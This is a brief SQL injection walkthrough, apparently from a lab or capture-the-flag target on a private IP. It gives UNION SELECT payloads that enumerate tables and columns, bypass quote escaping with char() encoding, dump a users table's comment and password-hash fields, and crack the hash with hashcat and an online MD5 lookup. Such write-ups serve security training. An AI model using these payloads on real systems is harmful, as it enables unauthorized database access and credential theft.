# SQL injection member exploit walkthrough

## http://172.28.128.136/?page=member

### 1. Get table's names:

`1 union select TABLE_NAME, 2 from information_schema.tables`

---

### 2. Get all 'users' table column's names:

`1 union select column_name, 2 FROM information_schema.columns WHERE table_name = char(117,115,101,114,115)`

_NOTE:_ mariaDB uses magic quotes defence, so we need to use the char rappresentation of 'users' &rarr; char(117,115,101,114,115)

---

### 3. Analyze other user's fields

`1 union select Commentaire, countersign FROM users`

---

### 4. Identify encrypting algorithm:

`hashcat --identify`

---

### 5. Decrypt 'countersign' value:

https://md5decrypt.net/en/
